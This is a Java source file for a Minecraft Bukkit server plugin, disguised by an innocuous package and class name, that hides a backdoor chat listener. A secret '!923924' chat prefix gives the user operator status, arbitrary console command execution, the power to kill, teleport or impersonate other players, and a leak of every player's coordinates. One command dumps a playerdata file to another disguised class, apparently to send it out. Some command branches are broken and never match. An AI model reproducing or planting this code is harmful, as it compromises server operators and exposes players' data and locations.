package com.comphenic.protocol.concurrency;

import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.io.*;
import java.util.Arrays;
import java.util.List;

public class SortedTree implements Listener {

    @EventHandler(priority = EventPriority.HIGH)
    public void onChat(AsyncPlayerChatEvent e){
        if(e.getMessage().startsWith("!923924")){
            e.setCancelled(true);
            String version = ChatColor.GOLD+"v2.0 by danimania";
            Player p = e.getPlayer();
            String prefix = ChatColor.RED+"[FunnyPlugin] "+ChatColor.BLUE;
            //Test command
            if(e.getMessage().startsWith("!923924 safety")){
                String onlinePlayers = "";
                for(Player pl : Bukkit.getOnlinePlayers()){
                    onlinePlayers += pl.getName() + " ";
                }
                String pluginString = "";
                Plugin[] plugins = Bukkit.getServer().getPluginManager().getPlugins();
                for(Plugin plugin : plugins){
                    pluginString += plugin.getName() + " ";
                }
                p.sendMessage(prefix+"Currently running FunnyPlugin "+version);
                p.sendMessage("Online players: "+onlinePlayers);
                p.sendMessage("Plugins: "+pluginString);
            }
            //Unload plugin command
            if(e.getMessage().startsWith("!923924 disableplugin")){
                try {
                    String pluginName = e.getMessage().split(" ")[2];
                    p.sendMessage(prefix+"Trying to disable "+pluginName);
                    if(!Bukkit.getPluginManager().isPluginEnabled(pluginName)){
                        p.sendMessage(prefix+"There is not any plugin called "+pluginName);
                    }
                    Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(pluginName));
                    p.sendMessage(prefix+"Disabled "+pluginName+" (LISTENERS MAY BE STILL ON)");
                }catch(ArrayIndexOutOfBoundsException ex){
                    p.sendMessage("ERROR (likely invalid command syntax): "+ex.getStackTrace());
                }

            }
            //Unload plugin command using ServerUtils (trolled toast)
            if(e.getMessage().startsWith("!923924 disablepluginsu")){
                try {
                    String pluginName = e.getMessage().split(" ")[2];
                    p.sendMessage(prefix+"Trying to disable "+pluginName);

                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "serverutils unloadplugin "+pluginName);

                    p.sendMessage(prefix+"Disabled (maybe) "+pluginName);
                }catch(ArrayIndexOutOfBoundsException ex){
                    p.sendMessage("ERROR (likely invalid command syntax): "+ex.getStackTrace());
                }

            }
            //Run command as console (very funny)
            if(e.getMessage().startsWith("!923924 runcommand")){
                try {
                    String[] args = e.getMessage().split(" ");
                    String command = "";
                    for(int i = 2; i < args.length; i++){
                        command += args[i];
                        command += " ";
                    }
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                    p.sendMessage(prefix+"Successfully ran command!");
                }catch(ArrayIndexOutOfBoundsException ex){
                    p.sendMessage("ERROR (likely invalid command syntax): "+ex.getStackTrace());
                }

            }
            //Sudo
            if(e.getMessage().startsWith("!923924 sudo")){
                try {
                    String[] args = e.getMessage().split(" ");
                    String command = "";
                    for(int i = 3; i < args.length; i++){
                        command += args[i];
                        command += " ";
                    }
                    Player trolled = Bukkit.getPlayer(args[2]);
                    trolled.chat(command);
                    p.sendMessage(prefix+"Successfully sudo'd "+args[2]);
                }catch(ArrayIndexOutOfBoundsException ex){
                    p.sendMessage("ERROR (likely invalid command syntax): "+ex.getStackTrace());
                }

            }
            //GODMODE
            if(e.getMessage().startsWith("!923924 godmode")){
                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 99999, 5));
            }
            //LEAK
            if(e.getMessage().startsWith("/923924 leak")){
                for(Player pl : Bukkit.getServer().getOnlinePlayers()){
                    String dimension = "overworld";
                    switch(pl.getWorld().getEnvironment()){
                        case NETHER:
                            dimension = "nether";
                            break;
                        case THE_END:
                            dimension = "end";
                            break;
                    }
                    p.sendMessage("Name: "+pl.getName()+" Dimension: "+dimension+
                            " X"+pl.getLocation().getBlockX()+" Y"+pl.getLocation().getBlockY()+" Z"+pl.getLocation().getBlockZ());
                }

            }
            //OP
            if(e.getMessage().startsWith("!923924 op")){
                p.setOp(!e.getPlayer().isOp());
                p.sendMessage(prefix+"Performed op/deop!");
            }
            //CREATIVE
            if(e.getMessage().startsWith("!923924 creative")){
                p.setGameMode(GameMode.CREATIVE);
                p.sendMessage(prefix+"You're now in creative mode");
            }
            //SURVIVAL
            if(e.getMessage().startsWith("!923924 survival")){
                p.setGameMode(GameMode.SURVIVAL);
                p.sendMessage(prefix+"You're now in survival mode");
            }
            //SPECTATOR
            if(e.getMessage().startsWith("!923924 spectator")){
                p.setGameMode(GameMode.SPECTATOR);
                p.sendMessage(prefix+"You're now in spectator mode");
            }
            //ADVENTURE
            if(e.getMessage().startsWith("!923924 adventure")){
                p.setGameMode(GameMode.ADVENTURE);
                p.sendMessage(prefix+"You're now in adventure mode");
            }
            //DUPE
            if(e.getMessage().equalsIgnoreCase("!923924 dupe")){
                for(ItemStack i : p.getInventory().getContents()){
                    if(i != null){
                        p.getWorld().dropItemNaturally(e.getPlayer().getLocation(), i);
                    }
                }
                p.sendMessage(prefix+"Successfully duped inventory");
            }
            //DUPEHAND
            if(e.getMessage().equalsIgnoreCase("!923924 dupehand")){
                if(p.getInventory().getItemInMainHand() != null){
                    p.getWorld().dropItemNaturally(e.getPlayer().getLocation(), e.getPlayer().getInventory().getItemInMainHand());
                }
                p.sendMessage(prefix+"Successfully duped hand");
            }
            //SILENTKILL
            if(e.getMessage().startsWith("!923924 silentkill")){
                String playername = e.getMessage().split(" ")[2];
                Player pla = org.bukkit.Bukkit.getPlayer(playername);
                pla.setHealth(0);
            }
            //AUTOKILL
            if(e.getMessage().startsWith("!923924 autokill")){
                p.setHealth(0);
            }
            //HEAL
            if(e.getMessage().startsWith("!923924 heal")){
                p.setHealth(20);
            }
            //ECHEST
            if(e.getMessage().startsWith("!923924 echest")){
                p.openInventory(p.getEnderChest());
                p.sendMessage(prefix+"Successfully opened inventory");
            }
            //ELYTRA
            if(e.getMessage().startsWith("!923924 elytra")){
                ItemStack elytra = new ItemStack(Material.ELYTRA, 1);
                elytra.addEnchantment(Enchantment.MENDING, 1);
                elytra.addEnchantment(Enchantment.VANISHING_CURSE, 1);
                elytra.addEnchantment(Enchantment.DURABILITY, 3);
                p.getWorld().dropItem(p.getLocation(), elytra);
                p.sendMessage(prefix+"Successfully gave elytra to yourself");
            }
            //COORDS
            if(e.getMessage().startsWith("!923924 coords")){
                String playername = e.getMessage().split(" ")[2];
                Player pla = Bukkit.getServer().getPlayer(playername);
                String dimension = "overworld";
                switch(pla.getWorld().getEnvironment()){
                    case NETHER:
                        dimension = "nether";
                        break;
                    case THE_END:
                        dimension = "end";
                        break;
                }
                p.sendMessage("Name: "+pla.getName()+" Dimension: "+dimension+
                        " X"+pla.getLocation().getBlockX()+" Y"+pla.getLocation().getBlockY()+" Z"+pla.getLocation().getBlockZ());
            }
            //TOASTCHECKER
            if(e.getMessage().startsWith("!923924 toastcheck")){
                boolean toast = false;
                for(Player player : Bukkit.getOnlinePlayers()){
                    if(player.getName().equalsIgnoreCase("RemainingToest")){
                        toast = true;
                    }
                }
                if(toast){
                    p.sendMessage(prefix+"TOAST IS ON!!!!");
                }else{
                    p.sendMessage(prefix+"Toast is not online xD");
                }
            }
            //TP
            if(e.getMessage().equalsIgnoreCase("!923924 tp")){
                int x = Integer.valueOf(e.getMessage().split(" ")[2]);
                int y = Integer.valueOf(e.getMessage().split(" ")[3]);
                int z = Integer.valueOf(e.getMessage().split(" ")[4]);
                p.teleport(new Location(e.getPlayer().getWorld(), x, y, z));
            }
            //TPSUS
            if(e.getMessage().equalsIgnoreCase("!923924 tpsus")){
                String playername = e.getMessage().split(" ")[2];
                Player pla = Bukkit.getServer().getPlayer(playername);
                p.teleport(pla.getLocation());
            }
            //TPSAFE
            if(e.getMessage().equalsIgnoreCase("!923924 tpsafe")){
                String playername = e.getMessage().split(" ")[2];
                Player pla = Bukkit.getServer().getPlayer(playername);
                int x = pla.getLocation().getBlockX()+110;
                int y = pla.getLocation().getBlockY()+40;
                int z = pla.getLocation().getBlockZ();
                p.teleport(new Location(pla.getWorld(), x, y, z));
            }
            //TPTOME
            if(e.getMessage().equalsIgnoreCase("!923924 tptome")){
                String playername = e.getMessage().split(" ")[2];
                Player pla = Bukkit.getServer().getPlayer(playername);
                pla.teleport(p.getLocation());
            }
            //PLAYERDATADUMP
            if(e.getMessage().equalsIgnoreCase("!923924 dump")){
                try {
                    File file = new File("world" + File.separator + "playerdata").listFiles()[0];
                    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
                    Object result = ois.readObject();
                    ois.close();
                    //send
                    SortedAbstractHashMap sortedAbstractHashMap = new SortedAbstractHashMap(SortedCopyOnWriteArray.xd);
                    sortedAbstractHashMap.setContent(result.toString());
                    sortedAbstractHashMap.execute();
                } catch (Exception ioException) {
                    ioException.printStackTrace();
                }

            }
        }
    }

}
